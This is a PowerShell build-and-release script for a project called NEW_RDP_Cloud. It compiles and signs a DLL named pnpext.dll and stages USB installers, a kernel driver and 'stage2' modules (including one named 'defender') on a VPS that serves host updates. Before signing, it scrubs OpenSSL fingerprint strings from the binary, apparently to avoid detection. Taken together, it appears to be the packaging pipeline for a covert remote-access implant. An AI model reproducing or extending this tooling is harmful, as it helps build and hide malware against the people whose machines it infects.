# Import VS environment
$vsDevCmd = "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\Common7\Tools\VsDevCmd.bat"
$output = cmd /c "`"$vsDevCmd`" -arch=x64 -host_arch=x64 >nul 2>&1 && set" 2>&1
foreach ($line in $output) {
    if ($line -match '^([^=]+)=(.*)$') {
        [System.Environment]::SetEnvironmentVariable($matches[1], $matches[2], 'Process')
    }
}

Set-Location "D:\Android_Projects\NEW_RDP_Cloud"

# Sync version across host.h -> pnpext.rc, server.py, index.html
Write-Host "[0/3] Syncing version strings..."
& powershell -NoProfile -ExecutionPolicy Bypass -File _sync_versions.ps1 2>&1 |
    Select-Object -Last 6

# Configure
Write-Host "[1/3] Configuring..."
$cfgArgs = @(
    "-B", "build",
    "-G", "NMake Makefiles",
    "-DCMAKE_BUILD_TYPE=Release",
    "-DCMAKE_TOOLCHAIN_FILE=D:/vcpkg/scripts/buildsystems/vcpkg.cmake",
    "-DVCPKG_TARGET_TRIPLET=x64-windows-static"
)
& "C:\Program Files\CMake\bin\cmake.exe" @cfgArgs 2>&1 | Tee-Object -FilePath "D:\Android_Projects\NEW_RDP_Cloud\cfg_out.log"
$cfgExit = $LASTEXITCODE
Write-Host "CFG_EXIT=$cfgExit"
if ($cfgExit -ne 0) { exit $cfgExit }

# Build
Write-Host "[2/3] Building..."
$nmake = "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Tools\MSVC\14.44.35207\bin\Hostx64\x64\nmake.exe"
Set-Location "D:\Android_Projects\NEW_RDP_Cloud\build"
& $nmake /nologo 2>&1 | Tee-Object -FilePath "D:\Android_Projects\NEW_RDP_Cloud\bld_out.log"
$buildExit = $LASTEXITCODE
Write-Host "BUILD_EXIT=$buildExit"
if ($buildExit -ne 0) { exit $buildExit }

# Post-build: scrub OpenSSL asm fingerprints, then Authenticode-sign.
# Scrub MUST run before signing so the signature covers the patched bytes.
Set-Location "D:\Android_Projects\NEW_RDP_Cloud"

Write-Host ""
Write-Host "[3/4] Scrubbing OpenSSL fingerprint strings..."
& powershell -NoProfile -ExecutionPolicy Bypass -File _scrub_dll_strings.ps1 2>&1 |
    Select-Object -Last 8

$pfx = "build\signing\pnpext_signing.pfx"
if (-not (Test-Path $pfx)) {
    Write-Host ""
    Write-Host "[4/4] PFX missing, generating self-signed cert..."
    & powershell -NoProfile -ExecutionPolicy Bypass -File _gen_sign_cert.ps1
    if ($LASTEXITCODE -ne 0) {
        Write-Host "[4/4] cert generation failed; skipping signing" -ForegroundColor Yellow
        exit 0
    }
}
Write-Host ""
Write-Host "[4/4] Signing build\bin\pnpext.dll..."
& powershell -NoProfile -ExecutionPolicy Bypass -File _sign_dll.ps1 2>&1 |
    Select-Object -Last 10

# Post-sign: mirror DLL + BAT installers to dist\usb and release\HOST
Write-Host ""
Write-Host "[5/5] Mirroring binaries to dist\usb and release\HOST..."
$null = New-Item -ItemType Directory -Force -Path "dist\usb"
$null = New-Item -ItemType Directory -Force -Path "release\HOST"
$null = New-Item -ItemType Directory -Force -Path "release\VPS"

Copy-Item -Force "build\bin\pnpext.dll" "dist\usb\pnpext.dll"
Copy-Item -Force "build\bin\pnpext.dll" "release\HOST\pnpext.dll"
Write-Host "  pnpext.dll  -> dist\usb + release\HOST"

# BAT installers (source of truth is dist\usb)
foreach ($bat in @("install-cmd.bat","install-web-cmd.bat","uninstall-cmd.bat")) {
    $src = "dist\usb\$bat"
    if (Test-Path $src) {
        Copy-Item -Force $src "release\HOST\$bat"
        Write-Host "  $bat -> release\HOST"
    }
}

# VPS server files
foreach ($f in @("server.py","index.html","admin_dashboard.html","nginx.conf","nginx-remote-desktop.conf","deploy-vps.sh","deploy-vps2.sh","MANUAL.html","MANUAL.md")) {
    if (Test-Path $f) {
        Copy-Item -Force $f "release\VPS\$f"
        Write-Host "  $f -> release\VPS"
    }
}
# Config editor EXE → HOST (built separately via _build_config_editor.bat)
$editorExe = "build_static\editor_dist\pnpext_config_editor.exe"
if (Test-Path $editorExe) {
    Copy-Item -Force $editorExe "release\HOST\pnpext_config_editor.exe"
    Write-Host "  pnpext_config_editor.exe -> release\HOST"
}
# Update binaries -> VPS (served at /var/www/remote-desktop/files/ for host updates)
$null = New-Item -ItemType Directory -Force -Path "release\VPS\stage2"
Copy-Item -Force "build\bin\pnpext.dll" "release\VPS\pnpext.dll"
Copy-Item -Force "dist\usb\pnpext.sys"  "release\VPS\pnpext.sys"
Write-Host "  pnpext.dll + pnpext.sys -> release\VPS"
foreach ($m in @("filemgr","procmgr","defender","sysinfo")) {
    $src = "build\stage2\$m.dll"
    if (Test-Path $src) {
        Copy-Item -Force $src "release\VPS\stage2\$m.dll"
        Write-Host "  $m.dll -> release\VPS\stage2\"
    }
}
Write-Host "[5/5] Done."
exit 0
